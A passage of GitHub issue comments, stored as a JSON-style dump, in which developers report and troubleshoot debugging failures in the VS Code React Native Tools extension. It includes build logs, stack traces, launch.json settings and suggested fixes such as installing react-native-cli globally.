UP-TO-DATE\n:realm:prepareComFacebookReactReactNative0470Library UP-TO-DATE\n:realm:prepareComFacebookSoloaderSoloader010Library UP-TO-DATE\n:realm:prepareOrgWebkitAndroidJscR174650Library UP-TO-DATE\n:realm:prepareReleaseDependencies\n:realm:compileReleaseAidl UP-TO-DATE\n:realm:compileReleaseNdk UP-TO-DATE\n:realm:compileLint UP-TO-DATE\n:realm:copyReleaseLint UP-TO-DATE\n:realm:forwardDebugPort\n:realm:compileReleaseRenderscript UP-TO-DATE\n:realm:generateReleaseBuildConfig UP-TO-DATE\n:realm:generateReleaseResValues UP-TO-DATE\n:realm:generateReleaseResources UP-TO-DATE\n:realm:mergeReleaseResources UP-TO-DATE\n:realm:processReleaseManifest UP-TO-DATE\n:realm:processReleaseResources UP-TO-DATE\n:realm:generateReleaseSources UP-TO-DATE\n:realm:incrementalReleaseJavaCompilationSafeguard UP-TO-DATE\n:realm:compileReleaseJavaWithJavac UP-TO-DATE\n:realm:extractReleaseAnnotations UP-TO-DATE\n:realm:mergeReleaseShaders UP-TO-DATE\n:realm:compileReleaseShaders UP-TO-DATE\n:realm:generateReleaseAssets UP-TO-DATE\n:realm:mergeReleaseAssets UP-TO-DATE\n:realm:mergeReleaseProguardFiles UP-TO-DATE\n:realm:packageReleaseRenderscript UP-TO-DATE\n:realm:packageReleaseResources UP-TO-DATE\n:realm:processReleaseJavaRes UP-TO-DATE\n:realm:transformResourcesWithMergeJavaResForRelease UP-TO-DATE\n:realm:transformClassesAndResourcesWithSyncLibJarsForRelease UP-TO-DATE\n:realm:mergeReleaseJniLibFolders UP-TO-DATE\n:realm:transformNative_libsWithMergeJniLibsForRelease UP-TO-DATE\n:realm:transformNative_libsWithSyncJniLibsForRelease UP-TO-DATE\n:realm:bundleRelease UP-TO-DATE\n:app:prepareComAndroidSupportAppcompatV72301Library UP-TO-DATE\n:app:prepareComAndroidSupportSupportCompat2520Library UP-TO-DATE\n:app:prepareComAndroidSupportSupportCoreUi2520Library UP-TO-DATE\n:app:prepareComAndroidSupportSupportCoreUtils2520Library UP-TO-DATE\n:app:prepareComAndroidSupportSupportFragment2520Library UP-TO-DATE\n:app:prepareComAndroidSupportSupportMediaCompat2520Library UP-TO-DATE\n:app:prepareComAndroidSupportSupportV42520Library UP-TO-DATE\n:app:prepareComFacebookFbuiTextlayoutbuilderTextlayoutbuilder100Library UP-TO-DATE\n:app:prepareComFacebookFrescoDrawee101Library UP-TO-DATE\n:app:prepareComFacebookFrescoFbcore101Library UP-TO-DATE\n:app:prepareComFacebookFrescoFresco101Library UP-TO-DATE\n:app:prepareComFacebookFrescoImagepipeline101Library UP-TO-DATE\n:app:prepareComFacebookFrescoImagepipelineBase101Library UP-TO-DATE\n:app:prepareComFacebookFrescoImagepipelineOkhttp3101Library UP-TO-DATE\n:app:prepareComFacebookReactReactNative0470Library UP-TO-DATE\n:app:prepareComFacebookSoloaderSoloader010Library UP-TO-DATE\n:app:prepareComGoogleAndroidGmsPlayServicesBase1102Library UP-TO-DATE\n:app:prepareComGoogleAndroidGmsPlayServicesBasement1102Library UP-TO-DATE\n:app:prepareComGoogleAndroidGmsPlayServicesGcm1102Library UP-TO-DATE\n:app:prepareComGoogleAndroidGmsPlayServicesIid1102Library UP-TO-DATE\n:app:prepareComGoogleAndroidGmsPlayServicesTasks1102Library UP-TO-DATE\n:app:prepareComMicrosoftAzureMobileMobileCenter090Library UP-TO-DATE\n:app:prepareComMicrosoftAzureMobileMobileCenterAnalytics090Library UP-TO-DATE\n:app:prepareComMicrosoftAzureMobileMobileCenterCrashes090Library UP-TO-DATE\n:app:prepareComMicrosoftAzureMobileReactMobileCenterReactNative050Library UP-TO-DATE\n:app:prepareOrgWebkitAndroidJscR174650Library UP-TO-DATE\n:app:preparemy_appMobileCenterAnalyticsUnspecifiedLibrary UP-TO-DATE\n:app:preparemy_appMobileCenterCrashesUnspecifiedLibrary UP-TO-DATE\n:app:preparemy_appReactNativeCodePushUnspecifiedLibrary UP-TO-DATE\n:app:preparemy_appReactNativeDeviceInfoUnspecifiedLibrary UP-TO-DATE\n:app:preparemy_appReactNativeImagePickerUnspecifiedLibrary UP-TO-DATE\n:app:preparemy_appReactNativeVectorIconsUnspecifiedLibrary UP-TO-DATE\n:app:preparemy_appReactnativesignaturecaptureUnspecifiedLibrary UP-TO-DATE\n:app:preparemy_appRealmUnspecifiedLibrary UP-TO-DATE\n:app:prepareDebugDependencies\n:app:compileDebugAidl UP-TO-DATE\n:app:compileDebugRenderscript UP-TO-DATE\n:app:generateDebugBuildConfig UP-TO-DATE\n:app:mergeDebugShaders UP-TO-DATE\n:app:compileDebugShaders UP-TO-DATE\n:app:generateDebugAssets UP-TO-DATE\n:app:mergeDebugAssets UP-TO-DATE\n:app:generateDebugResValues\n:app:generateDebugResources\n:app:mergeDebugResources\n:app:recordFilesBeforeBundleCommandDebug\n:app:bundleDebugJsAndAssets SKIPPED\n:app:generateBundledResourcesHashDebug\n4f53cda18c2baa0c0354bb5f9a3ecbe5ed12ab4d8e11ba873c2f11161202b945\n:app:processDebugManifest UP-TO-DATE\n:app:processDebugResources\n:app:generateDebugSources\n:app:incrementalDebugJavaCompilationSafeguard UP-TO-DATE\n:app:compileDebugJavaWithJavac UP-TO-DATE\n:app:compileDebugNdk UP-TO-DATE\n:app:compileDebugSources UP-TO-DATE\n:app:transformClassesWithDexForDebug UP-TO-DATE\n:app:mergeDebugJniLibFolders UP-TO-DATE\n:app:transformNative_libsWithMergeJniLibsForDebug UP-TO-DATE\n:app:processDebugJavaRes UP-TO-DATE\n:app:transformResourcesWithMergeJavaResForDebug UP-TO-DATE\n:app:validateSigningDebug\n:app:packageDebug\n:app:assembleDebug\n:app:installDebug\nInstalling APK 'app-debug.apk' on 'Redmi Note 4 - 7.0' for app:debug\nInstalled on 1 device.\nBUILD SUCCESSFUL\nTotal time: 13.639 secs\nRunning /Users/buzz/Library/Android/sdk/platform-tools/adb -s 1291ee280104 reverse tcp:8081 tcp:8081\nStarting the app on 1291ee280104 (/Users/buzz/Library/Android/sdk/platform-tools/adb -s 1291ee280104 shell am start -n au.com.easy2use.transistor/au.com.easy2use.transistor.MainActivity)...\nStarting: Intent { cmp=au.com.easy2use.transistor/.MainActivity }\n````\nOutput of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab)\n. @sergey-akhalkov thanks for the follow up. Yes, I just checked with the latest version of vscode and the problem still exists when debugging on my Android device. However, I did notice that everything works correctly when I debug on my iOS simulator. . @sergey-akhalkov Is there any additional information I can supply you with to help get to the bottom of this? Or is there anything I can try on my end?. ",
    "afefer": "I'm also encountering the same bug, always repros. I'm using the iOS simulator.\nVS Code: 1.23.0-insider (also repros with 1.23.0 non-insider)\nReact Native Tools: 0.6.9\nOS platform and version: OSX High Sierra 10.13.4\nNodeJS version: 10.0.0\nReact Native version: 0.55.3\nreact-native-cli version: 2.0.1. ### Output of the Debug Console (View -> Toggle Debug Console)\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.17.3\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox)\n```\n[Info] Starting Packager\nScanning folders for symlinks in /Users/myusername/Projects/AwesomeProject/node_modules (17ms)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                                                              \u2502\n\u2502  Running Metro Bundler on port 8081.                                         \u2502\n\u2502                                                                              \u2502\n\u2502  Keep Metro running while developing on any JS projects. Feel free to        \u2502\n\u2502  close this tab and run your own Metro instance if you prefer.               \u2502\n\u2502                                                                              \u2502\n\u2502  https://github.com/facebook/react-native                                    \u2502\n\u2502                                                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLooking for JS files in\n   /Users/myusername/Projects/AwesomeProject \nMetro Bundler ready.\nLoading dependency graph, done.\n[Info] Packager started.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] Entry point at /Users/myusername/Projects/AwesomeProject/index.ios.js doesn't exist. Skipping prewarming...\n[Info] Building and running application.\n```\nOutput of the React-Native: iOS output channel (View -> Toggle Output -> Select React-Native: Run iOS in ListBox)\n```\n[Info] Starting React Native Packager.\nScanning folders for symlinks in /Users/myusernameProjects/AwesomeProject/node_modules (13ms)\n10:05:19 PM: Starting packager...\n10:05:25 PM: Starting simulator...\n10:05:26 PM: Packager started!\nTo view your app with live reloading, point the Expo app to this QR code.\nYou'll find the QR scanner on the Projects tab of the app.\n\nOr enter this address in the Expo app's search bar:\nexp://192.168.1.68:19000\nYour phone will need to be on the same local network as this computer.\nFor links to install the Expo app, please visit https://expo.io.\nLogs from serving your app will appear here. Press Ctrl+C at any time to stop.\nIf you restart the simulator or change the simulated hardware, you may need to restart this process.\n```\nOutput of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab)\nut/vs/workbench/workbench.main.js:263 [Extension Host] (node:7451) DeprecationWarning: os.tmpDir() is deprecated. Use os.tmpdir() instead. (at process.on (internal/process/warning.js:21:17))\nt.log @ /private/var/folders/1z/pj11ldjn6552_nhkccwmxb3w0000gn/T/AppTranslocation/2\u2026Insiders.app/Contents/Resources/app/out/vs/workbench/workbench.main.js:263. I'm able to repro this issue as well - I get the \"Unverified breakpoint, breakpoint set but not yet bounded\" message when I hover over a breakpoint. If I insert a \"debugger\" statement, VS code correctly stops.\nApp debugs in Chrome (http://localhost:19001/debugger-ui) just fine. I have the packager running in a separate terminal window and the app running in an iOS simulator w/ Expo.\nReact Native Tools VS Code extension version: 0.6.9\nVSCode version: 1.23.0-insider\nOS platform and version: Mac OS High Sierra 10.13.4\nNodeJS version: 10.0.0\nReact Native version: 0.55.3. ",
    "fcaride": "Hi @svekl ! Thanks for your quick response!\nI tried that using this config:\n        {\n            \"name\": \"Attach to packager\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"attach\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\",\n            \"port\": \"19000\"\n        }\nAnd it returns this in the console:\nCould not debug. Cannot attach to packager. Are you sure there is a packager and it is running in the port 8081? If your packager is configured to run in another port make sure to add that to the setting.json.\n. Also, I didn't say it but I am using the packager of Expo, i know there is a way to attach an expo project but this is a detached expo project so it's not so easy.. No problem i just could do it! Thanks my bad. ",
    "scolestock": "This seems to work - the output ends with:\n```\nreact-native start --port 8081 --root .vscode --assetExts ttf\nScanning folders for symlinks in /Users/scott/src/blah/node_modules (106ms)\n \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n \u2502  Running Metro Bundler on port 8081.                                       \u2502\n \u2502                                                                            \u2502\n \u2502  Keep Metro Bundler running while developing on any JS projects. Feel      \u2502\n \u2502  free to close this tab and run your own Metro Bundler  instance if you    \u2502\n \u2502  prefer.                                                                   \u2502\n \u2502                                                                            \u2502\n \u2502  https://github.com/facebook/react-native                                  \u2502\n \u2502                                                                            \u2502\n \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLooking for JS files in\n   /Users/scott/src/blah\n   /Users/scott/src/blah/.vscode\nMetro Bundler ready.\nLoading dependency graph, done.\n```\n. This was a local environment issue of some sort - all is working now.  Thanks!. Can confirm repro of this issue with versions below.  Turning breakpoints off/on again allows for them to trigger.\nmac vs code Version 1.20.1 (1.20.1)\nreact native tools extension 0.6.4\nreact-native-cli: 2.0.1\nreact-native: 0.52.0. Still an issue in VSCode Version 1.21.1 (1.21.1), React Native Tools 0.6.6, \nreact-native-cli: 2.0.1\nreact-native: 0.54.2. I can also confirm I'm having this same issue, with the same output in Developer tools console.\nSoftware versions:\nReact-Native VS Code extension version: 0.6.2\nVSCode version: 1.20.1\nOS platform and version: macOS 10.13.3\nNodeJS version: 8.9.1\nReact Native version: 0.52.0\nOutput: \n{ Error: connect ENOENT /tmp/vscode-reactnative-6e8d5c66a6b6ee68087ee4366e492217296e1441eb7a925f408e417a2d91a364.sock\n    at Object.exports._errnoException (util.js:1050:11)\n    at exports._exceptionWithHostPort (util.js:1073:20)\n    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1097:14)\n  code: 'ENOENT',\n  errno: 'ENOENT',\n  syscall: 'connect',\n  address: '/tmp/vscode-reactnative-6e8d5c66a6b6ee68087ee4366e492217296e1441eb7a925f408e417a2d91a364.sock' }{ Error: connect ENOENT /tmp/vscode-reactnative-6e8d5c66a6b6ee68087ee4366e492217296e1441eb7a925f408e417a2d91a364.sock\n    at Object.exports._errnoException (util.js:1050:11)\n    at exports._exceptionWithHostPort (util.js:1073:20)\n    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1097:14)\n  code: 'ENOENT',\n  errno: 'ENOENT',\n  syscall: 'connect',\n  address: '/tmp/vscode-reactnative-6e8d5c66a6b6ee68087ee4366e492217296e1441eb7a925f408e417a2d91a364.sock' }\nAnd in dev tools:\n``\n/Applications/Visual Studio Code.app/Contents/Resources/app/out/vs/workbench/workbench.main.js:4183 Activating extensionvsmobile.vscode-react-native` failed: Cannot find module 'app-center-node-client'.\nR._logMessageInConsole  @   /Applications/Visual Studio Code.app/Contents/Resources/app/out/vs/workbench/workbench.main.js:4183\n```. @Gremlin80 I tried uninstalling the extension and then installing a previous version by downloading from this link (formulated following instructions on a stackoverflow article): \nhttps://ms-vscode.gallery.vsassets.io/_apis/public/gallery/publisher/vsmobile/extension/vscode-react-native/0.6.0/assetbyname/Microsoft.VisualStudio.Services.VSIXPackage\nRename file extension to VSIX, then use the ellipses button in the extensions panel (mac) to \"install from VSIX\".\nHowever, I found that while the debugger ran and I get console output, no breakpoints were hit.... @nahuelhds Your technique above (cleaning up, using the Expo packager, and then using \"Attach to packager\") is working somewhat for me - but with the curious behavior that I have to turn breakpoints on and off every time I reload the JS bundle in order to get execution to break.  \nIt will be awesome to have this whole extension working again - this was my primary workflow.\nEdit:  I guess having to re-establish breakpoints is exactly what the chrome-hosted debugger requires after reloading, so perhaps that is expected behavior when using \"attach\".. ",
    "nitishrana28": "I launched Debug iOS. Also updated my issue as per template.. These are the ones which I have installed. Are you telling about the first extension (c#) or others as well ?\n\n. The second error got removed (cli tools) but Debug adapter process has terminated unexpectedly still persists. I removed just c# extension.. It does. But every time I have to run these 2 commands before doing that.\nnpm install -g react-native-cli\nexport PATH=\"/usr/local/Cellar/node/8.9.0/bin/:$PATH\"\nAnd the final output is an error :\n```\nInstalling build/Build/Products/Debug-iphonesimulator/firstdemo.app\nAn error was encountered processing the command (domain=NSPOSIXErrorDomain, code=2):\nFailed to install the requested application\nAn application bundle was not found at the provided path.\nProvide a valid path to the desired application bundle.\nPrint: Entry, \":CFBundleIdentifier\", Does Not Exist\nCommand failed: /usr/libexec/PlistBuddy -c Print:CFBundleIdentifier build/Build/Products/Debug-iphonesimulator/firstdemo.app/Info.plist\nPrint: Entry, \":CFBundleIdentifier\", Does Not Exist\n```. @vincentsong : You still facing it or fixed it ?. Well I have tried restarting VS Code as well as my system. The issue however persists.\n@iTOYS : Please share the solution/fix for this. I am not able to proceed.. @FletcherISO : This fixed the issue I have been facing. .react folder still doesn't show up but project runs successfully after trying this\n\ntry running code . from the root directory of your project folder. You will need to install the shell command if you haven't already (type 'shift-command-p' and search for \"Shell command: Install code command PATH\").\n\nAny comment regarding .react folder ?. ",
    "vincentsong": "I got same problem too. @nitishrana28  I restart the vs code and it's gone, but it's reporting time out to open tunnel now. > > @vincentsong : You still facing it or fixed it ?\n\ncan u speak Chinese?\n\n@NarutoOnePiece  Yes\uff0c\u6211\u53ef\u4ee5\nbut I didn't work on RN recently, just keep watching it.. ",
    "FletcherISO": "@nitishrana28 I have a potential fix for your issue here on your SO post.\nHopefully this will resolve your issue as it did mine.. ",
    "shanelile": "I am reproducing this as well. Is there any debugging/logging on launch that might help diagnose why .vscode/.react isn't being created on startup? I'm launching from Terminal and this worked once, but after rebooting my laptop it regressed.. ",
    "jkooper": "same here. problem still exists. ",
    "gc1508": "hey! getting the same error. Unable to debug in VSCode due to the following error:\n2workbench.main.js:sourcemap:2255 Debug adapter process has terminated unexpectedly\ne.onDidNotificationChange @ workbench.main.js:sourcemap:2255\n(anonymous) @ workbench.main.js:sourcemap:2255\ne.fire @ workbench.main.js:sourcemap:169\ne.notify @ workbench.main.js:sourcemap:2248\ne.error @ workbench.main.js:sourcemap:3095\nt.onDebugAdapterExit @ workbench.main.js:sourcemap:2444\n(anonymous) @ workbench.main.js:sourcemap:2437\ne.fire @ workbench.main.js:sourcemap:169\n(anonymous) @ workbench.main.js:sourcemap:2389\nemitTwo @ events.js:111\nemit @ events.js:194\n__dirname.ChildProcess._handle.onexit @ internal/child_process.js:215\nCould you advice pls? \nThanks.\nCheers,\nGianluca.. ",
    "bg-wilkesreid": "At no time has running code . from terminal from inside my React Native project directory has a .vscode/.react folder been created.. ",
    "bgou": "for me the problem seems to be:\n\"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\nI don't see anything in .vscode:\n\n. ",
    "NarutoOnePiece": "\n@vincentsong : You still facing it or fixed it ?\n\ncan u speak Chinese?\n. > > > @vincentsong : You still facing it or fixed it ?\n\n\ncan u speak Chinese?\n\n@NarutoOnePiece Yes\uff0c\u6211\u53ef\u4ee5\nbut I didn't work on RN recently, just keep watching it.\n\n\n@vincentsong : You still facing it or fixed it ?\n\ncan u speak Chinese?\n\n@NarutoOnePiece Yes\uff0c\u6211\u53ef\u4ee5\nbut I didn't work on RN recently, just keep watching it.\n\nare u Chinese?. ",
    "Myll": "I was facing this issue.. I had to install the react-native-cli:\nnpm install -g react-native-cli then reload the VS Code project. Then the .vscode/.react folder should get created during debugging.. ",
    "alexey-m-ukolov": "I had this exact problem after updating from 0.49.5 to 0.51.0. Turning debugger off and on again fixed it.\nP.S. I don't use VSCode, so I don't think this issue caused by this plugin, I got here via Google search.. ",
    "garciawarneckee": "No matter what I do if I use \"Attach to packager\" one or \"Debug in Exponent\" the message is the same.. In both cases the output in the terminal is blank and VS Code spawn an alert \"Debug adapter process has terminated unexpectedly\".. CRAN is  for create-react-native-app ? I'm using nvm to set node.js version Idk if it's useful data.... ",
    "reaysawa": "OS: Windows 10\nVSCode 1.19.3\nTrying to run on Android gives me the same error message.\nCommand Pallette -> Run Android on Simulator\n```\n[Error] Failed to run the application in Android\nStack: TypeError: Failed to run the application in Android: Cannot read property 'message' of undefined\n    at Function.getWrappedError (C:\\Users\\joaopaulo.vscode\\extensions\\vsmobile.vscode-react-native-0.5.7\\src\\common\\error\\internalError.js:35:16)\n    at Function.wrapError (C:\\Users\\joaopaulo.vscode\\extensions\\vsmobile.vscode-react-native-0.5.7\\src\\common\\error\\errorHelper.js:18:44)\n    at resultOfCode.done.reason (C:\\Users\\joaopaulo.vscode\\extensions\\vsmobile.vscode-react-native-0.5.7\\src\\common\\entryPointHandler.js:40:72)\n    at _rejected (C:\\Users\\joaopaulo.vscode\\extensions\\vsmobile.vscode-react-native-0.5.7\\node_modules\\q\\q.js:844:24)\n    at C:\\Users\\joaopaulo.vscode\\extensions\\vsmobile.vscode-react-native-0.5.7\\node_modules\\q\\q.js:870:30\n    at Promise.when (C:\\Users\\joaopaulo.vscode\\extensions\\vsmobile.vscode-react-native-0.5.7\\node_modules\\q\\q.js:1122:31)\n    at Promise.promise.promiseDispatch (C:\\Users\\joaopaulo.vscode\\extensions\\vsmobile.vscode-react-native-0.5.7\\node_modules\\q\\q.js:788:41)\n    at C:\\Users\\joaopaulo.vscode\\extensions\\vsmobile.vscode-react-native-0.5.7\\node_modules\\q\\q.js:604:44\n    at runSingle (C:\\Users\\joaopaulo.vscode\\extensions\\vsmobile.vscode-react-native-0.5.7\\node_modules\\q\\q.js:137:13)\n    at flush (C:\\Users\\joaopaulo.vscode\\extensions\\vsmobile.vscode-react-native-0.5.7\\node_modules\\q\\q.js:125:13)\n    at _combinedTickCallback (internal/process/next_tick.js:73:7)\n    at process._tickDomainCallback (internal/process/next_tick.js:128:9)\n```\nWhen trying to Debug -> Debug Android it gives me another error.\nI have noticed the launchReactNative.js is not being generated when I open the project (CRAN) from the CLI, Open Folder or Open With VSCode from explorer.\npackage.json\n{\n  \"name\": \"test\",\n  \"version\": \"0.1.0\",\n  \"private\": true,\n  \"devDependencies\": {\n    \"jest-expo\": \"25.0.0\",\n    \"react-native-scripts\": \"1.11.1\",\n    \"react-test-renderer\": \"16.2.0\"\n  },\n  \"main\": \"./node_modules/react-native-scripts/build/bin/crna-entry.js\",\n  \"scripts\": {\n    \"start\": \"react-native-scripts start\",\n    \"eject\": \"react-native-scripts eject\",\n    \"android\": \"react-native-scripts android\",\n    \"ios\": \"react-native-scripts ios\",\n    \"test\": \"node node_modules/jest/bin/jest.js\"\n  },\n  \"jest\": {\n    \"preset\": \"jest-expo\"\n  },\n  \"dependencies\": {\n    \"@expo/vector-icons\": \"^6.2.2\",\n    \"expo\": \"^25.0.0\",\n    \"native-base\": \"^2.3.7\",\n    \"react\": \"16.2.0\",\n    \"react-native\": \"0.52.0\"\n  }\n}\nIf I'm missing some configuration step, let me know :). @sergey-akhalkov I could track down what was the problem in my case. I was missing react-native-cli from my global modules.\nSo what I had to do was npm install -g react-native-cli and it got the packager to start.\nAlso to be noted: the extension is still not generating the launchReactNative.js file for me.. my bad @annakocheshkova, I have updated the issue's description to include the behavior fields\nby the way, running the app through react-native-scripts android (the default run-script for CRAN applications) works perfectly fine, either on an emulated device or a real one. Just as proof that my setup is mostly correct, I am able to debug remotely through the browser using React-Devtools. Breakpoints from VSCode obviously don't work but breakpoints set up from the browser work fine.\nI'll be using this for now until we get more clarification going on this issue, no rush. Take it easy. \ud83d\ude04 \n\n. My launch.json file is the same as the auto-generated one and looks nothing out of the ordinary. The same goes on for the rest of the app, it's just a plain starting app created with CRAN.\n{\n    // Use IntelliSense to learn about possible attributes.\n    // Hover to view descriptions of existing attributes.\n    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"Debug Android\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"android\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        },\n        {\n            \"name\": \"Debug iOS\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"ios\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        },\n        {\n            \"name\": \"Attach to packager\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"attach\",\n            \"sourceMaps\": true,\n            \"port\": \"19000\",\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        },\n        {\n            \"name\": \"Debug in Exponent\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"exponent\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n        }\n    ]\n}\nBy the way, the port option in Attach to packager is also not respected. The whole situation seems iffy to me.. ",
    "kashishgrover": "Even I get the same problem. I am using a Macbook.\n```\n[Error] Failed to start the React Native packager\nStack: TypeError: Failed to start the React Native packager: Cannot read property 'message' of undefined\n    at Function.getWrappedError (/Users/kashishgrover/.vscode/extensions/vsmobile.vscode-react-native-0.6.6/src/common/error/internalError.js:35:16)\n    at Function.wrapError (/Users/kashishgrover/.vscode/extensions/vsmobile.vscode-react-native-0.6.6/src/common/error/errorHelper.js:18:44)\n    at resultOfCode.done.reason (/Users/kashishgrover/.vscode/extensions/vsmobile.vscode-react-native-0.6.6/src/common/entryPointHandler.js:40:72)\n    at _rejected (/Users/kashishgrover/.vscode/extensions/vsmobile.vscode-react-native-0.6.6/node_modules/q/q.js:844:24)\n    at /Users/kashishgrover/.vscode/extensions/vsmobile.vscode-react-native-0.6.6/node_modules/q/q.js:870:30\n    at Promise.when (/Users/kashishgrover/.vscode/extensions/vsmobile.vscode-react-native-0.6.6/node_modules/q/q.js:1122:31)\n    at Promise.promise.promiseDispatch (/Users/kashishgrover/.vscode/extensions/vsmobile.vscode-react-native-0.6.6/node_modules/q/q.js:788:41)\n    at /Users/kashishgrover/.vscode/extensions/vsmobile.vscode-react-native-0.6.6/node_modules/q/q.js:604:44\n    at runSingle (/Users/kashishgrover/.vscode/extensions/vsmobile.vscode-react-native-0.6.6/node_modules/q/q.js:137:13)\n    at flush (/Users/kashishgrover/.vscode/extensions/vsmobile.vscode-react-native-0.6.6/node_modules/q/q.js:125:13)\n    at _combinedTickCallback (internal/process/next_tick.js:73:7)\n    at process._tickDomainCallback (internal/process/next_tick.js:128:9)\n```\n. @ruslan-bikkinin oh shit thank you so much. We use a Monorepo structure and I never thought that could be the issue. It works flawlessly now. \ud83d\ude04 . ",
    "egorshulga": "Error message is Error while executing command 'react-native.cmd -v'. \nBut for react-native this switch is not defined. \nI found a place in the code with a -v option coded here. \n@iTOYS, shouldn't it be changed to -V?. @iTOYS, nope: error: unknown option '-v'\nreact-native -V shows 0.52.0 version.. S:\\...\\MobileUI>react-native -V\nScanning folders for symlinks in C:\\Users\\...\\AppData\\Local\\Yarn\\config\\global\\node_modules (60ms)\n0.52.0\nyarn info react-native-cli shows version '2.0.1'. It is hard to find any other piece of information to find out, what's going on.\nThis is console output from vscode dev tools.\n\n@iTOYS, these are just assumptions: \nmaybe it tries to parse react-native version and fails?\nmaybe it tries to create .react folder and fails for whatever reason?\n. react-native-cli should be installed globally?. @svekl,\n```\nyarn global v1.3.2\ninfo fsevents@1.1.3: The platform \"win32\" is incompatible with this module.\ninfo \"fsevents@1.1.3\" is an optional dependency and failed compatibility check. Excluding it from installation.\nwarning \" > react-native@0.52.0\" has unmet peer dependency \"react@16.2.0\".\ninfo \"gulp@3.9.1\" has binaries:\n   - gulp\ninfo \"jshint@2.9.5\" has binaries:\n   - jshint\ninfo \"react-native@0.52.0\" has binaries:\n   - react-native\ninfo \"source-map-explorer@1.5.0\" has binaries:\n   - source-map-explorer\ninfo \"typescript@2.6.2\" has binaries:\n   - tsc\n   - tsserver\ninfo \"vsce@1.31.1\" has binaries:\n   - vsce\ninfo \"webpack-cyclic-dependency-checker@0.0.1\" has binaries:\n   - iscyclic\nDone in 15.99s.\n``. Let me clarify:react-native-cli` should be installed globally for this extension to work properly.\nIt should be definitely added to the readme.. Thanks to maintainers for help and support!. ",
    "matthew-an": "Thanks a lot! @iTOYS It works. \nBut it will be great if you can update the \"Debug on iOS device\" part in the documentation below to avoid confusion for other users. \nhttps://github.com/Microsoft/vscode-react-native/blob/master/doc/debugging.md\nCheers!\n. ",
    "MacKentoch": "I encounter same issue, with:\n- VSCode 1.21\n- React Native Tools up to date\n- node 8.9.3\n- react-native-cli: 2.0.1\n- react-native: 0.51.0\n- macOS 10.13.3\nNo react-native configuration is showed to selection, see talkative print screen:\n\nI never use react-native-tools but I wanted to give a try...\nSeems like no luck for me \ud83d\ude05. ",
    "rodrigoelp": "Hi @sergey-akhalkov, I am really sorry I did not reply before as I was away from civilisation for a month. I still have this issue and I was considering removing vscode entirely and install it again to see if there is a corrupted configuration or something. I got the same behaviour as described by @MacKentoch . ",
